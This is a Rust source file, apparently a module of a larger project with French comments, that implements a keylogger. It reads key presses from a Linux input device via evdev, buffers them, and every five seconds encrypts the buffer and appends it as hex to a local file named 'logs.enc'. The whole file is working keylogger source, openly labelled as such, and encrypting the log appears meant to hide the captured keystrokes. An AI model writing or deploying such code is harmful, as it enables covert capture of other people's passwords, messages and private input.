use evdev::{Device, InputEventKind};
use std::fs::File;
use std::sync::{Arc, Mutex};
use std::thread;
use std::time::Duration;

use crate::modules::crypto::encrypt_log;
use std::fs::OpenOptions;
use std::io::Write;

fn write_encrypted_log(encrypted_data: Vec<u8>) {
    let hex = hex::encode(encrypted_data);

    let mut file = OpenOptions::new()
        .create(true)
        .append(true)
        .open("logs.enc")
        .unwrap();

    writeln!(file, "{}", hex).unwrap();
}

pub fn start_keylogger(device_path: &str) {
    let file = File::open(device_path).expect("Impossible d'ouvrir le device");
    let mut dev = Device::new().unwrap();
    dev.set_file(file);

    let buffer = Arc::new(Mutex::new(String::new()));
    let buffer_clone = Arc::clone(&buffer);

    // Thread secondaire : toutes les 5 sec on chiffre et écrit les logs
    thread::spawn(move || loop {
        thread::sleep(Duration::from_secs(5));
        let mut buf = buffer_clone.lock().unwrap();
        if !buf.is_empty() {
            let encrypted = encrypt_log(&buf);
            write_encrypted_log(encrypted);
            buf.clear();
        }
    });

    println!("[*] Keylogger démarré sur {device_path}");

    // Thread principal : écoute les frappes
    loop {
        for ev in dev.fetch_events().unwrap() {
            if let InputEventKind::Key(key) = ev.kind() {
                if ev.value() == 1 {
                    let mut buf = buffer.lock().unwrap();
                    buf.push_str(&format!("{:?} ", key));
                }
            }
        }
        thread::sleep(Duration::from_millis(10));
    }
}
